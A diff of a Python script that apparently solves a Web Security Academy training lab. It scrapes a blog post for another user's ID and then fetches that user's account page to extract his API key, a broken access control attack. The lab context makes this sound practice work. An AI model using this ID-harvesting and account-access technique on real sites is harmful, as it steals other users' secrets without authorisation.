@@ -4,7 +4,7 @@ import re
 
 
 s = requests.Session()
-site = 'ac981f7b1efd76d38070105000c8005e.web-security-academy.net'
+site = 'ac2f1f381e189b0380d24bae003400f9.web-security-academy.net'
 login_url = f'https://{site}/login'
 resp = s.get(login_url)
 soup = BeautifulSoup(resp.text, 'html.parser')
@@ -18,9 +18,15 @@ logindata = {
 resp = s.post(login_url, data=logindata)
 print(resp.status_code)
 
-# Now to get the API Key:
 
-resp = s.get(url='https://ac981f7b1efd76d38070105000c8005e.web-security-academy.net/my-account?id=carlos', data=logindata)
+blogsite = 'https://ac2f1f381e189b0380d24bae003400f9.web-security-academy.net/post?postId=9'
+resp = s.get(blogsite)
+soup = BeautifulSoup(resp.text, 'html.parser')
+carlos_userid = soup.find('a',text='carlos')['href'].split('=')[1]
+print(carlos_userid)
+
+# Now to get the API Key:
+resp = s.get(url=f'https://{site}/my-account?id={carlos_userid}', data=logindata)
 print(resp)
 soup = BeautifulSoup(resp.text, 'html.parser')
 div_text = soup.find('div', text=re.compile('API')).text
